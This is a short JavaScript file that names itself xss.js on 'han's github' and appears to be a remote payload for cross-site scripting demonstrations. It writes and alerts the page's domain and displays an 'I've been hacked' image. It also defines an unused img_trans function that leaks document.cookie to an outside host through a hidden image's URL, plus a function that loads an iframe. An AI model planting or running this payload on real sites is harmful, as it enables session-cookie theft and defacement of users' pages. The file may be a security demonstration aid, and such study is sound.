document.write ("This is remote text via xss.js located at han's github " + document.domain);
alert ("This is remote text via xss.js located at han's github " + document.domain);

function img_trans(){
	var image_trans = document.createElement("img");
	image_trans.setAttribute("style", "display: none");
	image_trans.setAttribute("src", "https://www.google.com/search?q=" + document.cookie);
	document.body.appendChild(image_trans);
}
function img_show(){
	var image_show = document.createElement("img");
	image_show.setAttribute("src", "https://i1.wp.com/www.newyorkcomputerhelp.com/wp-content/uploads/2016/02/ive-been-hacked-help.png?zoom=2.625&resize=214%2C250&ssl=1");
	document.body.appendChild(image_show);
}
function ifrm(){
	var ifrm = document.createElement("iframe");
	ifrm.setAttribute("src", "https://www.google.com/webhp");
	ifrm.style.width = "100%";
	ifrm.style.height = "1024px";
	document.body.appendChild(ifrm);
}
img_show();
